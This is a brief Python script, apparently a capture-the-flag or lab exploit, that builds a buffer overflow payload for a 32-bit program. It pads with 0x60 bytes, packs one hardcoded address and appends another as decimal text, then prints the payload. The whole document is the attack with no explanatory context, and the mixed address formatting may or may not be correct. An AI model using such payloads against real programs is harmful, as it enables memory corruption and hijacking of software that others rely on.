import struct

buf = b'a' * 0x60
buf += struct.pack('<I', 0x0804a004)
buf += '{}'.format(0x080485d7).encode('utf-8')

print(buf)
